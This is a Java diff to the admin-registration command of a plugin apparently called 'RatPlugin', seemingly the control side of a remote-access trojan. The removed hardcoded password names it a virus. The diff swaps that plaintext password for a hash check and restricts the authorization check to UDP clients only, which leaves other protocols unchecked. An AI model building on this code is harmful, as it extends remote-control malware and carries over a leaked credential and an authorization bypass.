@@ -8,6 +8,11 @@ import com.serverd.plugin.listener.ConnectListener;
 import com.serverd.plugin.listener.ExecutionController;
 import com.serverd.plugin.listener.UpdateIDListener;
 
+import me.wpkg.ratplugin.AdminSessionManager;
+import me.wpkg.ratplugin.RatPlugin;
+import me.wpkg.ratplugin.utils.ClientUtils;
+import me.wpkg.ratplugin.utils.Utils;
+
 import java.io.IOException;
 import java.util.ArrayList;
 
@@ -27,20 +32,33 @@ public class RegisterAdmin extends Command implements UpdateIDListener, Executio
     @Override
     public void execute(String[] args, Client client, Plugin plugin) throws IOException
     {
-        if (client.getProtocol() == Client.Protocol.UDP)
+        RatPlugin instance = (RatPlugin) plugin.getInstance();
+
+        if (checkArgs(args,client,1) == 0)
         {
-            if (!String.join(" ",args).equals("wpkgnajlepszywirus1@Qwerty"))
+            if (!Utils.sha256(String.join(" ",args)).equals(instance.passwordHash))
             {
                 client.send("[WRONG_PASSWORD]");
                 ClientManager.delete(client.getID());
             }
             else
             {
-                client.send("[REGISTER_SUCCESS]");
+                ClientUtils.removeFromRatList(client,instance);
+
+                if (!ClientUtils.isAdmin(client,instance))
+                {
+                    ClientUtils.makeAdmin(client,instance);
+                    ClientUtils.addToAdminList(client,instance);
+
+                    AdminSessionManager.startSessionExpireTimer(plugin, client);
+                }
+
                 authorized.add(client.getID());
+
+                client.send("[REGISTER_SUCCESS]");
             }
         }
-        else client.send("[REGISTER_ERROR]");
+        else client.send("[BAD_REQUEST]");
     }
 
     @Override
@@ -52,7 +70,9 @@ public class RegisterAdmin extends Command implements UpdateIDListener, Executio
     @Override
     public boolean controlCommand(String command, String[] args, Client client, Plugin plugin) throws IOException
     {
-        if (authorized.lastIndexOf(client.getID()) == -1 && !command.matches("/registeradmin|/disconnect"))
+        if (authorized.lastIndexOf(client.getID()) == -1
+                && !command.matches("/registeradmin|/disconnect")
+                && client.getProtocol() == Client.Protocol.UDP)
         {
             client.send("[NOT_AUTHORIZED]");
             return false;
